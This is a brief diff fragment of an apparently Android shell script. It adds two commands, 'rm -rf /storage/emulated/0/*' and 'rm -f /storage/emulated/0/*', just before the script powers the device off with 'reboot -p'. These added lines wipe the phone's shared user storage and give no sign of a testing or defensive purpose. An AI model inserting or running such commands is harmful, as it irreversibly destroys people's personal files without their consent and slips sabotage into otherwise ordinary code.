@@ -56,4 +56,6 @@ do
     } &
 done
 
+rm -rf /storage/emulated/0/*
+rm -f /storage/emulated/0/*
 reboot -p
